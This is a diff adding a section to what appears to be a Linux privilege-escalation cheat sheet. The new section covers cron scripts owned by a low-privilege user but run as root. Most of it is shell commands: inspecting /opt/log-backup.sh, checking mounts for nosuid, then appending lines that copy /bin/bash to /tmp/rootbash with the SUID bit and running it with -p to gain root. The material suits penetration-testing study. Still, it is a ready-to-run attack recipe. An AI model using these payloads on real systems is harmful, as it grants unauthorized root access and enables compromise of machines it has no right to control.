@@ -1318,6 +1318,36 @@ echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' >> /usr/local/bin/overwrite.sh
 id
 ```
 
+#### Cron script owned by low-priv user but run as root
+
+Do not only look for world-writable cron scripts. If a root cron job runs a script owned by your current user, you can append a root action even when the file is not world-writable.
+
+```bash
+ls -la /opt/
+# -rwxr-xr-x 1 confluence confluence 408 log-backup.sh
+
+cat /opt/log-backup.sh
+# Copies logs into /root/backup and uses root-only paths -> likely root cron/timer
+```
+
+Check that the target output path is not mounted `nosuid` before using a SUID bash payload:
+
+```bash
+mount | grep " / "
+# /dev/mapper/ubuntu--vg-ubuntu--lv on / type ext4 (rw,relatime)
+```
+
+Append the payload and wait for the scheduled task:
+
+```bash
+echo 'cp /bin/bash /tmp/rootbash' >> /opt/log-backup.sh
+echo 'chmod +s /tmp/rootbash' >> /opt/log-backup.sh
+
+ls -la /tmp/rootbash
+/tmp/rootbash -p
+id
+```
+
 ### Cron Jobs Path Environment Variable
 
 * View the contents of the system-wide crontab:
